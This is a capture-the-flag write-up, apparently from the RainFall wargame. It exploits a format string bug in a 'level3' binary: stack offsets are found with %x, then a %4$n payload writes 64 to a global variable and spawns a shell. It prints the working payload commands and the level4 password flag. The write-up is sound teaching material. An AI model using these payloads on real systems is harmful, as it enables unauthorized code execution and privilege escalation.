# Level3 — Format String Attack / Arbitrary Write

## Vulnerability

The binary uses `fgets()` for input (safe against buffer overflow), but then passes the buffer **directly to `printf()`** without a format string — a classic **format string vulnerability**. This allows reading from the stack with `%x` and writing to arbitrary memory addresses with `%n`.

The goal is to overwrite the global variable `m` (at `0x804988c`) with the value `64` (`0x40`) to satisfy a comparison that triggers `system("/bin/sh")`.

---

## Recon

**`main` only calls `v()`:**

```gdb
(gdb) disass main
   0x08048520 <+6>:   call   0x80484a4 <v>
```

**`v()` contains the vulnerability and the target condition:**

```gdb
(gdb) disass v
   0x080484c7 <+35>:  call   0x80483a0 <fgets@plt>    ; safe read (512 bytes max)
   0x080484d5 <+49>:  call   0x8048390 <printf@plt>   ; ← vulnerable! no format string

   0x080484da <+54>:  mov    0x804988c,%eax           ; load global var m
   0x080484df <+59>:  cmp    $0x40,%eax               ; compare m to 64
   0x080484e2 <+62>:  jne    0x8048518 <v+116>        ; skip shell if m != 64
   ...
   0x08048513 <+111>: call   0x80483c0 <system@plt>   ; system("/bin/sh")
```

**Inspecting the target variable `m`:**

```gdb
(gdb) print &m
$2 = (<data variable, no debug info> *) 0x804988c

(gdb) print *0x804988c
$1 = 0    ; starts at 0, needs to reach 64
```

**Finding our position on the stack** with a canary (`BBBB` = `0x42424242`):

```bash
python -c "print('BBBB' + '_%x' * 10)" > /tmp/exploit
cat /tmp/exploit | ./level3
# BBBB_200_b7fd1ac0_b7ff37d0_42424242_...
#                             ^ position 4 on the stack
```

Our input lands at the **4th argument** on the stack — so `%4$n` will write to the address we place at the start of the buffer.

---

## Exploit

**Step 1 — Confirm the write primitive:**

```bash
python -c "print('\x8c\x98\x04\x08' + '_%4\$n')" > /tmp/exploit
```

In GDB, after `printf` returns:

```gdb
(gdb) print *0x804988c
$1 = 5    ; 4 bytes (address) + 1 byte ("_") = 5 chars printed → m = 5 ✓
```

**Step 2 — Pad to exactly 64 bytes printed before `%n`:**

We need `printf` to have printed exactly **64 characters** when `%4$n` fires:
- 4 bytes → the address itself (`\x8c\x98\x04\x08`)
- 59 bytes → padding (`'a' * 59`)
- 1 byte → `_`
- Total: **64** → `m = 0x40` ✓

```bash
python -c "print('\x8c\x98\x04\x08' + 'a' * 59 + '_%4\$n')" > /tmp/exploit
cat /tmp/exploit - | ./level3
```

---

## Flow

```
v() calls fgets()  →  user controls input buffer
        │
        ▼
v() calls printf(buffer)  ←  no format string argument: VULNERABLE
        │
        ├── %x leaks stack values (used to find our position → arg 4)
        │
        └── %4$n writes the byte count printed so far into *arg[4]
                │
                ▼
         arg[4] = 0x804988c  (address of global var m)
         bytes printed = 64  →  m = 64 = 0x40
                │
                ▼
        cmp m, 0x40  →  equal  →  JNE not taken
                │
                ▼
        system("/bin/sh")  ←  shell spawned as level4
```

**Shell session after exploitation:**

```bash
level3@RainFall:~$ cat /tmp/exploit - | ./level3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa_
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

---

## Commands Summary

```bash
# Inspect the target global variable
gdb ./level3
(gdb) print &m                          # → 0x804988c
(gdb) print *0x804988c                  # → 0 (initial value)

# Find our stack position (look for 42424242 in output)
python -c "print('BBBB' + '_%x' * 10)" > /tmp/exploit
cat /tmp/exploit | ./level3             # → position 4

# Confirm arbitrary write works
python -c "print('\x8c\x98\x04\x08' + '_%4\$n')" > /tmp/exploit
# (check *0x804988c == 5 in gdb)

# Final payload: 4 (addr) + 59 (padding) + 1 (_) = 64 bytes → m = 0x40
python -c "print('\x8c\x98\x04\x08' + 'a' * 59 + '_%4\$n')" > /tmp/exploit

# Execute the exploit
cat /tmp/exploit - | ./level3
```
